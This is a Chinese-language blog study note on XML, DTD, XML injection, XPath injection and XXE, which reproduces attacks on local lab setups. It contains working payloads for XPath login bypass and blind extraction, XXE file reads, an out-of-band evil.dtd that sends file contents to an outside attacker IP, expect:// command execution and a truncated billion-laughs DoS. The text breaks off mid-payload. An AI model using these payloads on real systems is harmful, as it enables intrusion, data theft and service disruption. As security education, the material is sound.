    <content type="html"><![CDATA[<p>自己对这个漏洞不懂原理，以及不会深入利用，就看看师傅的文章，搬运顺便复现部分场景吧。</p><p>[TOC]</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><strong>什么是XML</strong></p><p> XML 指可扩展标记语言（EXtensible Markup Language）。<br> XML 的设计宗旨是传输数据，而不是显示数据。<br> XML 是 W3C 的推荐标准。<br> XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br> XML 语言没有预定义的标签。</p><p><strong>XML和HTML的区别</strong></p><p> XML 被设计用来传输和存储数据，其焦点是数据的内容。<br> HTML 被设计用来显示数据，其焦点是数据的外观。<br> HTML 旨在显示信息，而 XML 旨在传输信息。</p><p><strong>XML被用来做什么</strong></p><p>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML基本格式</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</code></pre><p><strong>基本语法</strong></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><strong>基本概念</strong></p><p> XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br> DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p><strong>实体引用</strong></p><pre><code class="xml">XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</code></pre><p><strong>示例代码</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;PCDATAPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换。CDATACDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</code></pre><p><strong>DTD元素</strong></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150727-65e7882a-14d2-1.png" alt="img"></p><h1 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h1><blockquote><p> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br> 实体引用是对实体的引用。<br> 实体可在内部或外部进行声明。</p></blockquote><p><em>按实体有无参分类，实体分为一般实体和参数实体</em></p><pre><code class="xml">一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</code></pre><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>按实体使用方式分类，实体分为内部声明实体和引用外部实体</p><p><strong>内部实体</strong></p><pre><code class="xml">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p><strong>内部实体示例代码：</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre><p><strong>外部实体</strong></p><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><pre><code class="xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p><strong>外部实体示例代码:</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre><p>外部实体可支持http、file等协议。不同程序支持的协议不同：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150935-b26e4a30-14d2-1.png" alt="img"></p><p> PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202151023-cf02c3ba-14d2-1.png" alt="img"></p><p><strong>PHP引用外部实体，常见的利用协议</strong>：</p><pre><code class="xml">file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><strong>参数实体+外部实体</strong></p><pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;%file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的。</code></pre><h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><blockquote><p> XML的设计宗旨是传输数据，而非显示数据。<br> XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。</p></blockquote><p><strong>XML注入简介</strong></p><p> XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p><p><strong>XML注入前提</strong></p><p> （1）用户能够控制数据的输入<br> （2）程序有拼凑的数据</p><p><strong>案例演示</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：</p><pre><code class="xml">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;username&gt;hack&lt;/username&gt;&lt;password&gt;hacker    # 在原文中给出的是 admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;，我觉得这样不对，当然也有可能是我想错了，先填坑吧</code></pre><p>那么上述代码就会变为</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><p><strong>XML注入防御</strong></p><p> （1）对用户的输入进行过滤<br> （2）对用户的输入进行转义</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152614-05da2f0c-14d5-1.jpg" alt="img"></p><h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><p><strong>Xpath注入简介</strong></p><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p><p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><p><strong>Xpath攻击特点</strong></p><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。</p><p>XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势：</p><ol><li>广泛性<br> 只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。</li><li>危害性大<br> XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br> XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。</li></ol><p><strong>XPath注入攻击原理与应用</strong></p><p>XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。<br> 注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> <code>parameters/input</code>等。</p><p> 首先要去了解xPath基础语法—–&gt;  <a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></p><p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p><p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p><p><strong>XPath直接注入</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>test.php(用于接受传入参数，并进行xml查询)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value)&#123;        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;        echo &#39;&lt;br /&gt;Password:&#39;.$value-&gt;password;    &#125;&#125;?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp"><code>simplexml_load_file()</code>函数</a></strong><br> 返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据</p><p>我们先传入正常参数</p><pre><code>http://127.0.0.1/test.php?name=test1&amp;pwd=test1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230048387.png" alt="image-20220421230048387"></p><p>成功返回了我们需要的值</p><p>如果我们在username中输入恶意的值，比如</p><pre><code>&#39; or 1=1 or &#39;&#39; = &#39;</code></pre><p>那么我们的XPath查询语句就变为</p><pre><code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39; = &#39;&#39; and password/text()=&#39;test1&#39;] #and的优先级高于or</code></pre><p>我们看出现了什么情况</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230408461.png" alt="image-20220421230408461"></p><p>这个语句导致了什么呢？就是所有的user元素都满足要求</p><p>上面这个字符串会在逻辑上使查询一直返回 true，并将一直允许攻击者访问系统</p><p>攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。</p><p><strong>XPath盲注</strong></p><p>如果想要构造恶意语句遍历出整个XML文档，一般步骤如下：</p><p>1.盲注根节点</p><p>利用count（/*）判断根下节点：</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421233640335.png" alt="image-20220421233640335"></p><p>这条语句的作用是什么呢？我们来刨析下</p><pre><code>/root/users/user[username/text()=&#39;&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>对于这个XPath语句，首先执行and语句</p><pre><code>&#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>这条恒为假</p><p>然后</p><pre><code>username/text()=&#39;&#39; or count(/*) = 1</code></pre><p>这条在根节点为1的时候为真，不是1就为假</p><p>然后简化一下</p><pre><code>真/假 or 假</code></pre><p>我们发现，判断这条语句是否为真的关键点是</p><pre><code>count(/*) = 1</code></pre><p>当根节点为1时，就可以选出所以user元素，不是1时，就无法选出，由此就可以判断根节点个数</p><p>仅仅判断了个数是不够的，还要知道它是什么字符才可以，可以使用substring分割根节点的每个字符，猜解第一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421234716211.png" alt="image-20220421234716211"></p><p>根据这样的原理写一个脚本就ok了</p><p>2.盲注root的下一级节点</p><p>判断root是否有下一级(1个)节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p>同理猜解root下一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421235135999.png" alt="image-20220421235135999"></p><p>一直按照这样的步骤往下即可</p><p><strong>XPath注入危害</strong></p><ul><li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。</li><li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li><li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li></ul><p><strong>XPath注入防御</strong></p><ol><li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li><li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。</li><li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。</li><li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</li><li>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</li></ol><h1 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h1><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br> XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br> XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br> <a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p><strong>本地环境搭建</strong></p><p>test.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化XML解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li><li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li><li>获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。</li></ul><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003257935.png" alt="image-20220422003257935"></p><p>成功读取了我e盘的文件</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003239790.png" alt="image-20220422003239790"></p><p><strong>XXE常见利用方式</strong></p><p>与SQL相似，XXE漏洞也分为有回显和无回显<br> 有回显，可以直接在页面中看到payload的执行结果或现象。<br> 无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><strong>任意文件读取</strong></h2><p><strong>我们在这里采用一个靶场来分析</strong></p><p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422004849510.png" alt="image-20220422004849510" style="zoom:67%;"><p>靶场源码:</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;admin&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;   &#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p><strong>有回显</strong></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005656974.png" alt="image-20220422005656974"></p><p>当然，也可以使用<code>php://filter</code>协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005948762.png" alt="image-20220422005948762"></p><p><strong>无回显</strong></p><p>无回显的话，就会麻烦许多</p><p>我们先修改源码，禁掉输出代码和报错信息，改成无回显。</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010158422.png" alt="image-20220422010158422"></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010234624.png" alt="image-20220422010234624"></p><p>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p><p>这里我的服务器ip为:39.105.71.63</p><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/flag.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.105.71.63:66/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>远程服务器部署evil.dtd内容为:</p><pre><code class="xml">&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25;   send SYSTEM &#39;http://39.105.71.63:66/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>内部的%号要进行实体编码成<code>&amp;#x25</code></p><p>我们直接把这个文件放到一个网站上，我这里就直接利用宝塔咯(我是懒狗)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021836512.png" alt="image-20220422021836512"></p><p>然后向我们本地的靶机发送payload</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021925811.png" alt="image-20220422021925811"></p><p>成功回显出了文件</p><p><em>无回显攻击流程：</em></p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><p>这样就实现了外带数据的效果，解决 XXE 无回显的问题。</p><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h2><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>通过XXE可以实现RCE的实例很少。</p><h2 id="拒绝服务攻击-DDOS"><a href="#拒绝服务攻击-DDOS" class="headerlink" title="拒绝服务攻击(DDOS)"></a><strong>拒绝服务攻击(DDOS)</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 